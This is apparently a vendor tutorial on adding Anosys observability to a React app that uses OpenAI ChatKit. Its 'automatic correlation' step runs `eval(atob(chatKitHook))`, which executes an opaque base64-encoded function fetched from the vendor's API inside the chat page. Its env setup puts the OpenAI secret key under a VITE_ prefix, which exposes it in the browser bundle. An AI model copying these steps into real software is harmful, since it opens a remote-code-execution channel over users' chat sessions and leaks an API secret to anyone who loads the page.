# Tutorial: Setting up Anosys Observability for OpenAI ChatKit

This guide explains how to integrate Anosys observability into a React application using OpenAI ChatKit. This setup allows you to track chat sessions, durations, "thought" processes, and custom user actions.

## 1. Environment Configuration

First, ensure your `.env` (or equivalent) has the required keys. Anosys uses these to resolve your ingestion endpoint and associate logs with the correct workflow.

```env
VITE_ANOSYS_API_KEY=your_anosys_api_key_here
VITE_OPENAI_WORKFLOW_ID=your_openai_workflow_id_here
VITE_OPENAI_API_SECRET_KEY=your_openai_secret_key_here
```

## 2. Implement the Observability Hook

To track chat sessions and metrics, you need to create two core files. These files handle the connection to Anosys and provide utility functions for mapping ChatKit logs.

### A. Create the Helper Utilities
**File Path:** `src/utils/chatHelpers.js`

This file contains functions to extract text from ChatKit items and map them to Anosys-compatible payloads.

```javascript
// src/utils/chatHelpers.js
export function extractTextFromContent(contentArray) { /* ... */ }
export function extractSummaryFromContent(contentArray) { /* ... */ }
export function mapChatkitLogsToAnosys(input) { /* ... */ }
```

### B. Create the Observability Hook
**File Path:** `src/hooks/useChatObservability.js`

This hook manages your correlation IDs (Session ID, Thread ID) and handles the actual `fetch` requests to the Anosys ingestion endpoint.

```javascript
// src/hooks/useChatObservability.js
import { useState, useRef, useEffect } from 'react';
import { mapChatkitLogsToAnosys } from '../utils/chatHelpers';

export function useChatObservability() {
    // ... logic for session management and Anosys ingestion ...
}
```

Refer to the full implementation in [useChatObservability.js](file:///Users/moisisv/Projects/DemoCustomer/src/hooks/useChatObservability.js) and [chatHelpers.js](file:///Users/moisisv/Projects/DemoCustomer/src/utils/chatHelpers.js).

## 3. Integrate with ChatKit

In your chat component (typically found in `src/components/ChatWidget.jsx`), follow these steps:

### A. Initialize the Hook
```javascript
import { useChatObservability } from '../hooks/useChatObservability';

const {
    setCorrelationIds,
    onLog,
    onResponseStart,
    onResponseEnd,
    chatKitHook
} = useChatObservability();
```

### B. Pass Callbacks to `useChatKit`
Integrate the observability callbacks directly into the `useChatKit` configuration. This allows Anosys to listen to internal ChatKit events.

```javascript
const { control, ref } = useChatKit({
    // ... other config ...
    
    // Anosys Callbacks
    onLog,           // Captures custom actions and internal logs
    onResponseStart, // Marks the beginning of an LLM response for latency tracking
    onResponseEnd,   // Triggers message synchronization and duration calculation
});
```

### C. Setup Automatic Correlation
Anosys provides a specialized "hook" script (resolved via API) that automatically syncs the OpenAI Thread ID and Session ID. Add this `useEffect` to your component:

```javascript
useEffect(() => {
    if (!chatKitHook) return;
    // The chatKitHook is a base64 encoded function from Anosys 
    // that sets up listeners on the ChatKit ref to sync IDs automatically.
    return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
}, [ref, isOpen, setCorrelationIds, chatKitHook]);
```

## 4. Tracking Custom Actions (Optional)

If you have custom buttons or interactions within your chat, you can log them using the `onLog` function already integrated. For example, if a "Copy" action is triggered in the UI, `onLog` will automatically capture it if it's emitted as a `message.action` event.

## 5. Verification

Once integrated:
1. Open your browser's **Network tab**.
2. Look for a `POST` request to your Anosys ingestion URL (usually `anosys.ai/api/v1/ingest/...` or similar).
3. Ensure the payload contains `cvs3` (Session ID) and `cvs4` (Thread ID) after the first message is exchanged.

> [!TIP]
> You can find a detailed mapping of all variables sent to Anosys in the [Anosys Observability Report](file:///Users/moisisv/Projects/DemoCustomer/anosys_observability_report.md).
